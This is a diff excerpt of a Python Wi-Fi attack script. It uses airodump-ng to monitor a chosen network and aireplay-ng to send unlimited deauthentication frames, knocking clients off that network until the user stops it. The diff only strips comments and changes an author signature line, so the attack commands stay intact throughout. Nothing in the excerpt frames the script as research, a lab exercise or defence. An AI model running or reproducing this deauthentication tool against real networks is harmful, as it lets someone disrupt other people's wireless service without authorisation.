@@ -67,18 +67,15 @@ try:
         print(f"\nMonitoring Network SSID: {selected_network['SSID']}, MAC: {hackbssid}, Channel: {hackchannel}\n")
         airodump_proc = subprocess.Popen(["sudo","airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "wlan0mon"],
                                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(0.3)  # Give airodump-ng time to gather data
-        # Perform deauthentication attack
+        time.sleep(0.3) 
         print(f"Deauthenticating on the network: {selected_network['SSID']} (MAC: {hackbssid})...")
         subprocess.run(["sudo","aireplay-ng", "--deauth", "0", "-a", hackbssid, "wlan0mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        # Stop airodump-ng after attacking the network
+        # Stop airodump-ng 
         airodump_proc.terminate()
-        time.sleep(1)  # Slight delay between attacks
-
+        time.sleep(1)
 except KeyboardInterrupt:
     print("\nAttack stopped by user.")
 finally:
-    # Stop monitor mode
     subprocess.run(["sudo","airmon-ng", "stop", "wlan0mon"])
     os.system('clear')
-# Badass
+# Mouad Garroud
